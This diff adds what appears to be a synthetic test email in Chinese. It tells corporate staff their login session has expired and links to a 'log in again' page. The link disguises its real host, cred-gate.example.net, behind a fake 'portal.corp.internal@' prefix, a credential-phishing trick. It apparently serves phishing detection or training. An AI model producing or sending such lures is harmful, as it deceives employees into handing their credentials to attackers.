@@ -1,0 +1,9 @@
+From: =?utf-8?B?6Zeo5oi3?= <portal@mail-gw.example>
+To: staff@corp.internal
+Date: Fri, 28 Aug 2026 14:17:00 +0800
+Message-ID: <0007-b5@synth.example>
+Subject: 登录态失效
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body><p>登录态已过期，重新登录：</p><p><a href='https://portal.corp.internal@cred-gate.example.net/re?u=1'>重新登录</a></p></body></html>
